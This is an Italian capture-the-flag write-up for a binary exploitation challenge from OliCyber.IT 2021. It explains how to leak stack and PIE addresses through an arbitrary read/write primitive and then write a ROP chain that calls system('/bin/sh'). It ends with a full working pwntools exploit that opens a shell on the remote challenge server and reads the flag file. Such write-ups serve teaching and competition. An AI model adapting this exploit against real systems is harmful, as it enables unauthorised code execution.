# OliCyber.IT 2021 - Competizione nazionale

## [binary-4] I predatori dell'indirizzo perduto 2 (10 risoluzioni)

La seconda flag, `flag2.txt`, si trova sul server remoto, quindi dovremo ottenere RCE e leggere la flag.

### Soluzione

Per ottenere code execution possiamo sfruttare la primitiva di arbitrary write e scrivere una ropchain sullo stack.  
L'ELF della challenge è compilato con `-static-pie`. Quindi se vogliamo chiamare la `system()` dobbiamo prima leakare il base address del binario.

Usando la stessa tecnica di prima possiamo leggere lo stack cercando di leakare gli indirizzi dello stack e di PIE.  
Una volta leakati possiamo scrivere una semplice ropchain del tipo:

```
POP_RDI_RET + "/bin/sh" + system()
```

- Il gadget `POP_RDI_RET` lo troviamo dentro al binario.
- La stringa `/bin/sh` è presente nel binario per via della seguente print nel main:

```c
bputs("... dovunque, non otterrai mai /bin/sh"); // <---
```

- La funzione `system` è stata inclusa nel binario per via del seguente codice presente nella funzione `motd`:

```c
void motd() {
  char* succ = NULL;
  char buf[0x20];
  bputs("Come si chiama l'attore che interpreta il padre di Indiana Jones, ma che cerca di usare race conditions?");
  succ = fgets(buf, 0x20, stdin);
  if (succ == NULL) {
    ERR("Reading actor");
  }
  if (strstr(buf, "Sean Concurrency")) {
    bputs("Ottima risposta, sei un uomo istruito");
    system("cat flag.txt"); // <---- (flag.txt non è la flag)
    bputs("https://i.ytimg.com/vi/vf1L8Jsw0QY/mqdefault.jpg");
  } else {
    bputs("Nope, try again");
  }
  return;
}
```

### Exploit

Estrae sia la prima che la seconda flag.

```py
#!/usr/bin/env python
from pwn import ELF, context, args, gdb, remote, process, log, \
    p64, u64, ui, ROP


gdbscript = """
gef config context.nb_lines_stack 10
b *main + 287
continue
"""
filename = "predatori"
exe = context.binary = ELF(filename)
remotehost = ("predatori.challs.olicyber.it", 15006)


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        try:
            with open("gdbscript.txt", "w") as outfile:
                outfile.write(gdbscript)
        except PermissionError:
            log.warn("PermissionError opening gdbscript.txt file")
        return process([exe.path] + argv, *a, **kw)


def menu(choice: int):
    io.sendlineafter("3) Esci", f"{choice}")


def write(what, where):
    menu(2)
    io.sendafter("Indirizzo:", where)
    io.sendafter("bytes:", "8")
    io.sendafter("scrivere?", what)
    io.recvuntil("Fatto")
    io.recvline()


def read(where):
    menu(1)
    io.sendafter("Indirizzo:", where)
    io.recvuntil("richiesta.")
    io.recvline()
    return io.recvline().replace(b"1) LeggiCosaDove\n", b"")


def leak_stack_and_exe():
    flag1 = b""
    flag_started = False
    flag_start_offset = -1
    leaked_bytes_store = []
    for i in range(0, 255, 8):
        leaked_bytes = read(bytes([i]))
        log.debug(f"leaked addr: {leaked_bytes}")
        if b"flag{" in leaked_bytes:
            flag_started = True
            flag_start_offset = i
        if flag_started:
            flag1 += leaked_bytes
        if b"\x00" in leaked_bytes:
            flag_started = False
        leaked_bytes_store.append(leaked_bytes)
    flag1 = flag1.replace(b"\x00", b"").strip().decode()
    if flag_start_offset == -1:
        log.error("Flag1 not found")
    else:
        log.success(f"First flag: {flag1}")

    handle_address_exe(flag_start_offset, leaked_bytes_store)
    log.success(f"Broke ASLR for exe, {exe.address:#016x}")
    stack = handle_address_stack(flag_start_offset, leaked_bytes_store)
    log.success(f"Leaked stack address: {stack:#016x}")
    return stack


def handle_address_stack(flag_start_offset, leaked_bytes_store):
    addr_gut = (flag_start_offset - 0x20)//8
    if addr_gut > 0:
        return u64(leaked_bytes_store[addr_gut].ljust(8, b"\x00")) + 8
    log.error("Address of stack not found")


def handle_address_exe(flag_start_offset, leaked_bytes_store):
    addr_gut = (flag_start_offset + 0x40)//8
    if addr_gut < 16:
        exe.address = u64(leaked_bytes_store[addr_gut].ljust(8, b"\x00")) - exe.sym['__libc_csu_init']
        return
    addr_gut = (flag_start_offset - 0x18)//8
    if addr_gut > 0:
        exe.address = u64(leaked_bytes_store[addr_gut].ljust(8, b"\x00")) - (exe.sym['main'] + 267)
        return
    log.error("Address of exe not found.")


def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def exec_shell(stack):
    rop = ROP(exe)
    rop.call(exe.sym.system, [next(exe.search(b"/bin/sh"))])
    rop = rop.chain()
    for i, val in enumerate(chunks(rop, 8)):
        log.debug(f"Writing {i + 1}/{len(rop)}")
        write(val, p64(i*8 + stack))
    log.info("ROP written, exiting")
    menu(3)


if __name__ == "__main__":
    io = start()

    menu(0)
    io.sendlineafter("Jones", "aaaaa")
    stack = leak_stack_and_exe()
    exec_shell(stack)
    io.sendline("cat flag2.txt")

    io.interactive()
```
